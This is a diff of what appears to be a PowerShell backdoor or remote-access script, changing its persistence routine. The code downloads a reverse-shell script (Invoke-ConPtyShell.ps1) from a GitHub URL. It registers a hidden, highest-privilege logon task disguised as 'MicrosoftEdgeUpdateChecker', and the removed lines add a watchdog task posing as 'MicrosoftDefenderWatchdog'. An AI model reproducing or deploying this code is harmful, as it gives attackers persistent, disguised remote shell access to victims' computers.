@@ -363,55 +363,21 @@ function PortSuggest {
         $url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
         Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath
 
-        $mainTask = "MicrosoftEdgeUpdateChecker"
-        $watchdogTask = "MicrosoftDefenderWatchdog"
+        $taskName = "MicrosoftEdgeUpdateChecker"
 
-        # Удаляем обе задачи, если уже есть
-        schtasks /Delete /TN $mainTask /F > $null 2>&1
-        schtasks /Delete /TN $watchdogTask /F > $null 2>&1
+        schtasks /Query /TN $taskName 2>$null
+        if ($LASTEXITCODE -ne 0) {
+            schtasks /Create /TN $taskName /SC ONLOGON `
+                /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
+                /RL HIGHEST /F | Out-Null
+        }
 
-        # Создаём основную задачу
-        schtasks /Create /TN $mainTask `
-            /SC ONLOGON `
-            /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" `
-            /RL HIGHEST /F | Out-Null
-
-        # Снимаем ограничения по питанию
-        $task = Get-ScheduledTask -TaskName $mainTask
-        $task.Settings.DisallowStartIfOnBatteries = $false
-        $task.Settings.StopIfGoingOnBatteries = $false
-        Set-ScheduledTask -TaskName $mainTask -Settings $task.Settings
-
-        # Создаём "сторожевую" задачу — проверяет каждые 5 минут
-        $watchdogScript = "$env:APPDATA\WindowsDefender\watchdog.ps1"
-        $watchdogContent = @"
-\$target = 'MicrosoftUpdate.ps1'
-\$isRunning = Get-CimInstance Win32_Process | Where-Object { \$_.CommandLine -like "*\$target*" }
-
-if (-not \$isRunning) {
-    Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "`"$targetPath`""
-}
-"@
-        $watchdogContent | Set-Content -Path $watchdogScript -Encoding UTF8
-
-        schtasks /Create /TN $watchdogTask `
-            /SC MINUTE /MO 1 `
-            /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchdogScript`"" `
-            /RL HIGHEST /F | Out-Null
-
-        # Снимаем ограничения и с задачи-наблюдателя
-        $wdTask = Get-ScheduledTask -TaskName $watchdogTask
-        $wdTask.Settings.DisallowStartIfOnBatteries = $false
-        $wdTask.Settings.StopIfGoingOnBatteries = $false
-        Set-ScheduledTask -TaskName $watchdogTask -Settings $wdTask.Settings
-
-        return "[+] Persistence and watchdog installed successfully."
+        return "[+] Persistence established successfully!"
     }
     catch {
         return "[ERROR] Persistence failed: $($_.Exception.Message)"
     }
 }
-
 
 
 
@@ -669,7 +635,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            whatchdog testing                                                                                                                                                                    
+                                            TEST 4                                                                                                                                                                    
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
